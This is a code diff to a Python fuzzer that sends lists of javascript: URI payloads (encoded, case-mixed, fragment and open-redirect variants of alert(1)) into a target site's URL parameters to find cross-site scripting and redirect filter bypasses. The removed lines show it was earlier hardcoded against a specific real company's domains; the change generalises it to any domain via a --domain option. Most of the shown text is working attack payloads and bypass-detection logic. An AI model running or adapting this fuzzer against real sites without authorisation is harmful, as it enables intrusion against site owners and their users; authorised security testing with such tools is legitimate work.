@@ -27,7 +27,7 @@ import string
 init(autoreset=True)
 
 class JavaScriptProtocolFuzzer:
-    def __init__(self, target_url, threads=10, delay=0.1, timeout=10):
+    def __init__(self, target_url, threads=10, delay=0.1, timeout=10, target_domain=None):
         self.target_url = target_url
         self.threads = threads
         self.delay = delay
@@ -45,6 +45,13 @@ class JavaScriptProtocolFuzzer:
         self.parsed_url = urlparse(target_url)
         self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{self.parsed_url.path}"
         self.original_params = parse_qs(self.parsed_url.query)
+        
+        # Set target domain for payloads
+        if target_domain:
+            self.target_domain = target_domain
+        else:
+            # Extract domain from target URL if not provided
+            self.target_domain = self.parsed_url.netloc
         
     def generate_recollapse_payloads(self, base_payloads=None, fuzz_bytes=None, encodings=None, max_size=1):
         """
@@ -206,13 +213,13 @@ class JavaScriptProtocolFuzzer:
         
         # URL fragment and query tricks
         fragment_tricks = [
-            "https://www.example.come#javascript:alert(1)",
-            "https://www.example.com/#javascript:alert(1)",
-            "https://www.example.com/?x=javascript:alert(1)",
-            "https://www.example.com/%0Ajavascript:alert(1)",
-            "https://www.example.com/%23javascript:alert(1)",
-            "https://www.example.com/%3Fjavascript:alert(1)",
-            "https://www.example.com/%26javascript:alert(1)"
+            f"https://www.{self.target_domain}#javascript:alert(1)",
+            f"https://www.{self.target_domain}/#javascript:alert(1)",
+            f"https://www.{self.target_domain}/?x=javascript:alert(1)",
+            f"https://www.{self.target_domain}/%0Ajavascript:alert(1)",
+            f"https://www.{self.target_domain}/%23javascript:alert(1)",
+            f"https://www.{self.target_domain}/%3Fjavascript:alert(1)",
+            f"https://www.{self.target_domain}/%26javascript:alert(1)"
         ]
         
         # Protocol confusion
@@ -275,15 +282,15 @@ class JavaScriptProtocolFuzzer:
             "..//javascript:alert(1)",
             "\\javascript:alert(1)",
             # Fragment and query tricks
-            "https://site.com/#javascript:alert(1)",
-            "?next=https://site.com/?q=javascript:alert(1)",
+            f"https://{self.target_domain}/#javascript:alert(1)",
+            f"?next=https://{self.target_domain}/?q=javascript:alert(1)",
             # Case and separator confusion
             "JaVaScRiPt:alert(1)",
             "javascript:\talert(1)",
             "javascript:\nalert(1)",
             "javascript:\ralert(1)",
             # Path/host confusion
-            "javascript://cornelsen.de/%0Aalert(1)",
+            f"javascript://{self.target_domain}/%0Aalert(1)",
             "javascript://user@evil.com:alert(1)",
             # Exotic HTML entities
             "javascript&#58;alert(1)",
@@ -393,7 +400,7 @@ class JavaScriptProtocolFuzzer:
                 if location and ('javascript:' in location or 'alert(' in location):
                     return True
                 # If redirect is to a different domain, might be a bypass
-                if location and not any(domain in location for domain in ['cornelsen.de', 'cornelsen.ai']):
+                if location and not any(domain in location for domain in [self.target_domain]):
                     return True
                 # Normal redirects to same domain are not bypasses
                 return False
@@ -453,7 +460,7 @@ class JavaScriptProtocolFuzzer:
                 # If response contains normal page content, it's likely not a bypass
                 normal_indicators = [
                     'html', 'head', 'body', 'title', 'meta', 'link', 'script',
-                    'cornelsen', 'gateway', 'lti', 'learning', 'objects'
+                    self.target_domain.split('.')[0]  # Use domain name without TLD
                 ]
                 
                 normal_count = sum(1 for indicator in normal_indicators if indicator in response_text)
@@ -487,7 +494,7 @@ class JavaScriptProtocolFuzzer:
                     if 'javascript:' in location:
                         return True
                     # If redirect is to external domain, might be bypass
-                    if not any(domain in location for domain in ['cornelsen.de', 'cornelsen.ai']):
+                    if not any(domain in location for domain in [self.target_domain]):
                         return True
             
             return False
@@ -596,12 +603,14 @@ def main():
         epilog="""
 Examples:
   python3 javascript_protocol_fuzzer.py "https://example.com/page?param=value"
+  python3 javascript_protocol_fuzzer.py "https://example.com/page" --domain example.com
   python3 javascript_protocol_fuzzer.py "https://example.com/page" --threads 20 --delay 0.05
   python3 javascript_protocol_fuzzer.py "https://example.com/page" --timeout 15
         """
     )
     
     parser.add_argument("target_url", help="Target URL to test")
+    parser.add_argument("--domain", help="Target domain for payloads (default: extracted from target URL)")
     parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
     parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests in seconds (default: 0.1)")
     parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
@@ -619,7 +628,8 @@ Examples:
             target_url=args.target_url,
             threads=args.threads,
             delay=args.delay,
-            timeout=args.timeout
+            timeout=args.timeout,
+            target_domain=args.domain
         )
         
         fuzzer.run_fuzzer()
